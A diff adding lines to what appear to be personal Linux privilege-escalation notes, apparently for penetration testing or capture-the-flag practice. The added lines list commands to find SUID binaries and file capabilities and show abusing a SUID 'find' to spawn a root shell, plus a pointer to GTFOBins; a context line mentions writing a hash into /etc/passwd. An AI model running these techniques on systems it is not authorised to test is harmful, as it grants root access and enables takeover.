@@ -71,8 +71,13 @@ If you have write access to /etc/passwd/ you can write a password hash into the 
 
 INSECURE SYSTEM COMPONENTS
 
+find / -perm -u=s -type f 2>/dev/null -- finds cmds with suid but set. Can be exploited to run processes as root.
 
+for ex if you have find suid bit  set -- find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
 
+/usr/sbin/getcap -r / 2>/dev/null -- finds binaries with suid capabilities set.
+
+Search GTFObins for either binary with suid capabilties or cmds with suid bit set for quick exploitation
 
 
 
